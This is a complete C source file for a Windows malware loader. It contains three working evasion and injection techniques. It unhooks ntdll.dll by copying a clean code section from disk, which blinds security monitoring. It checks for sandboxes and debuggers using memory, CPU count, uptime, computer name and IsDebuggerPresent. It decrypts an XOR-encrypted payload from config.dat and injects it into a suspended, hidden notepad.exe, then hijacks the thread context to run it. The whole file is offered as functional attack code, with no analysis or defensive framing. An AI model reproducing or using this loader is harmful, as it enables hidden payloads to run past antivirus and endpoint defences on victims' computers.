#include <Windows.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

typedef struct {
    DWORD VirtualAddress;
    DWORD PointerToRawData;
    DWORD SizeOfRawData;
    CHAR  Name[8];
} IMAGE_SECTION_HEADER_RAW;

BOOL UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    BYTE* pNtdllBase = (BYTE*)hNtdll;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdllBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pNtdllBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    IMAGE_OPTIONAL_HEADER opt = pNt->OptionalHeader;
    IMAGE_FILE_HEADER file = pNt->FileHeader;

    CHAR sysPath[MAX_PATH];
    if (!GetSystemDirectoryA(sysPath, MAX_PATH)) return FALSE;
    CHAR ntdllPath[MAX_PATH];
    lstrcpyA(ntdllPath, sysPath);
    lstrcatA(ntdllPath, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileBuffer = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (!fileBuffer) { CloseHandle(hFile); return FALSE; }
    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        VirtualFree(fileBuffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER pFileDos = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS pFileNt = (PIMAGE_NT_HEADERS)(fileBuffer + pFileDos->e_lfanew);
    IMAGE_SECTION_HEADER* sectionHeaders = IMAGE_FIRST_SECTION(pFileNt);
    WORD numSections = pFileNt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < numSections; i++) {
        IMAGE_SECTION_HEADER sec = sectionHeaders[i];
        if (memcmp(sec.Name, ".text", 5) == 0 || (sec.Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            DWORD sectionVA = sec.VirtualAddress;
            DWORD sectionSize = sec.SizeOfRawData;
            DWORD sectionRaw = sec.PointerToRawData;

            if (sectionSize == 0) continue;

            BYTE* targetAddr = pNtdllBase + sectionVA;
            DWORD oldProtect;
            if (!VirtualProtect(targetAddr, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                VirtualFree(fileBuffer, 0, MEM_RELEASE);
                return FALSE;
            }
            memcpy(targetAddr, fileBuffer + sectionRaw, sectionSize);
            VirtualProtect(targetAddr, sectionSize, oldProtect, &oldProtect);
            VirtualFree(fileBuffer, 0, MEM_RELEASE);
            return TRUE;
        }
    }
    VirtualFree(fileBuffer, 0, MEM_RELEASE);
    return FALSE;
}

BOOL CheckEnvironment() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    if (!GlobalMemoryStatusEx(&memStatus)) return FALSE;
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return FALSE;

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return FALSE;

    if (GetTickCount64() < 10 * 60 * 1000) return FALSE;

    CHAR computerName[256] = {0};
    DWORD nameLen = sizeof(computerName);
    if (GetComputerNameA(computerName, &nameLen)) {
        CharUpperA(computerName);
        if (strstr(computerName, "SANDBOX") || strstr(computerName, "VIRUS") ||
            strstr(computerName, "MALWARE") || strstr(computerName, "SAMPLE") ||
            strstr(computerName, "TEST")) {
            return FALSE;
        }
    }

    if (IsDebuggerPresent()) return FALSE;

    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!CheckEnvironment()) return 1;
    if (!UnhookNtdll()) return 2;
    Sleep(5000);

    HANDLE hFile = CreateFileA("config.dat", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 3;
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return 4; }
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) { CloseHandle(hFile); return 5; }
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 6;
    }
    CloseHandle(hFile);

    BYTE key[] = {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0};
    int keyLen = sizeof(key);
    for (DWORD i = 0; i < fileSize; i++) {
        buffer[i] ^= key[i % keyLen];
    }

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE,
                         CREATE_SUSPENDED | CREATE_NO_WINDOW,
                         NULL, NULL, &si, &pi)) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        return 7;
    }

    LPVOID remoteAddr = VirtualAllocEx(pi.hProcess, NULL, fileSize,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    if (!remoteAddr) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 8;
    }
    if (!WriteProcessMemory(pi.hProcess, remoteAddr, buffer, fileSize, NULL)) {
        VirtualFreeEx(pi.hProcess, remoteAddr, 0, MEM_RELEASE);
        VirtualFree(buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 9;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        VirtualFreeEx(pi.hProcess, remoteAddr, 0, MEM_RELEASE);
        VirtualFree(buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 10;
    }
#ifdef _WIN64
    ctx.Rip = (DWORD64)remoteAddr;
#else
    ctx.Eip = (DWORD)remoteAddr;
#endif
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    VirtualFree(buffer, 0, MEM_RELEASE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
